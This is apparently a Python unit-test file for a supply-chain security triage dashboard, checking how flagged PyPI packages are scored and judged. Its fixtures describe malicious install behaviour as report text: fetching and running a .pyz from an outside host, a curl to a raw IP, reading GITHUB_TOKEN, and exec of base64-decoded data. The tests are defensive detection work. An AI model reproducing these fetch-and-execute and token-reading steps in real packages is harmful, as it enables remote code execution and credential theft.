#!/usr/bin/env python3
import unittest
from pathlib import Path
import sys

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import dashboard_server as server


class TriageOpsEvidenceTests(unittest.TestCase):
    def finding(self, package='mistralai', version='2.4.6', analysis='Deterministic rules flagged: credential-access, network-egress'):
        return {
            'finding_id': 'SCM-0F5D5BD1A07E9184',
            'ecosystem': 'pypi',
            'package': package,
            'new_version': version,
            'analysis': analysis,
            'report_path': '/Users/chrixchange/secopsai/data/supply_chain/reports/sample.md',
        }

    def test_advisory_backed_mistralai_is_likely_true_positive_without_local_usage(self):
        payload = server.build_evidence_verdict_payload(
            self.finding(),
            advisory={'matched': True, 'matches': [{'source_urls': ['https://example.test/advisory']}]},
            local_usage={'present': False, 'matches': [], 'searched_files': 3},
            report={
                'ok': True,
                'path': '/Users/chrixchange/secopsai/data/supply_chain/reports/sample.md',
                'text': 'Import-time execution downloads https://git-tanstack.com/transformers.pyz to /tmp/transformers.pyz and runs python3 /tmp/transformers.pyz while reading token environment variables.',
            },
            explanation={'matched_rules': ['credential-access', 'network-egress']},
        )
        self.assertIn(payload['package_verdict'], {'confirmed_true_positive', 'likely_true_positive'})
        self.assertEqual(payload['environment_impact'], 'not_observed')
        self.assertEqual(payload['recommended_disposition'], 'needs_review')
        self.assertGreaterEqual(payload['score'], 65)
        self.assertTrue(payload['references'])

    def test_absence_of_local_usage_does_not_override_package_verdict(self):
        payload = server.build_evidence_verdict_payload(
            self.finding(),
            advisory={'matched': True, 'matches': []},
            local_usage={'present': False, 'matches': []},
            report={'ok': True, 'text': 'setup.py contains a curl https://83.142.209.194/transformers.pyz call'},
            explanation={},
        )
        self.assertNotIn(payload['package_verdict'], {'false_positive', 'likely_false_positive'})
        self.assertEqual(payload['environment_impact'], 'not_observed')

    def test_weak_litellm_example_trends_false_positive(self):
        payload = server.build_evidence_verdict_payload(
            self.finding(package='litellm', version='1.85.0rc2', analysis='Deterministic rules flagged: generic metadata heuristic'),
            advisory={'matched': False, 'matches': []},
            local_usage={'present': False, 'matches': [], 'searched_files': 3},
            report={'ok': True, 'text': 'Report mostly contains generated asset and normal framework API client code.'},
            explanation={'matched_rules': ['generic metadata heuristic']},
        )
        self.assertIn(payload['package_verdict'], {'likely_false_positive', 'false_positive', 'needs_review'})
        self.assertLessEqual(payload['score'], 35)
        self.assertEqual(payload['environment_impact'], 'not_observed')

    def test_raw_report_strong_indicators_raise_score(self):
        evidence = server.parse_report_evidence(
            'setup.py writes /tmp/payload, calls curl https://example.test/a.py, reads GITHUB_TOKEN, then exec(base64.b64decode(blob))',
            ['example.test'],
        )
        self.assertTrue(evidence['signals']['install_time_execution'])
        self.assertTrue(evidence['signals']['outbound_network'])
        self.assertTrue(evidence['signals']['credential_access'])
        self.assertTrue(evidence['signals']['obfuscation'])
        self.assertTrue(evidence['signals']['suspicious_file_writes'])
        self.assertTrue(evidence['signals']['known_ioc_matches'])


if __name__ == '__main__':
    unittest.main()
